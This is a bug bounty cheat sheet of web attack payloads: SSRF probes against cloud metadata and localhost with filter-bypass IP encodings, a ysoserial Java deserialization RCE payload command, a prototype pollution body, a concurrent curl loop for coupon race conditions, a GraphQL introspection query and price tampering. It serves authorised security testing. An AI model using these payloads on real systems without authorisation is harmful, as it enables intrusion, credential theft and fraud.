# Bug Bounty — Advanced Vulnerabilities

### SSRF probe payloads

```
https://<target>/fetch?url=http://169.254.169.254/latest/meta-data/
https://<target>/fetch?url=http://localhost:80/admin
```

**Use when:** An app fetches a URL server-side (webhooks, image proxies, PDF generators) — testing for internal/cloud-metadata access.

---

### SSRF bypass tricks for filtered targets

```
http://127.0.0.1
http://0177.0.0.1        (octal)
http://2130706433        (decimal IP)
http://[::1]
```

**Use when:** The app blocks obvious `localhost`/`127.0.0.1` strings — alternate encodings sometimes slip past naive filters.

---

### Insecure deserialization detection (Java)

```
ysoserial CommonsCollections5 'id' > payload.bin
```

**Use when:** A Java app accepts serialized objects and you suspect a gadget-chain RCE.

---

### Prototype pollution probe (JS)

```
{"__proto__": {"isAdmin": true}}
```

**Use when:** Testing a JS backend/frontend for prototype pollution via a JSON merge/clone operation.

---

### Race condition test (parallel requests)

```
for i in $(seq 1 20); do curl -s https://<target>/redeem-coupon -d "code=<code>" & done; wait
```

**Use when:** Testing whether a limited-use action (coupon redemption, vote, withdrawal) can be exploited via concurrency.

---

### GraphQL introspection query

```
curl -s https://<target>/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name}}}}"}'
```

**Use when:** A GraphQL endpoint is exposed — introspection reveals the full schema, including hidden fields/mutations.

---

### Business logic — price/quantity tampering

```
{"item_id": 1, "price": 0.01, "quantity": 1}
```

**Use when:** A client-supplied price/quantity field isn't revalidated server-side in checkout flows.
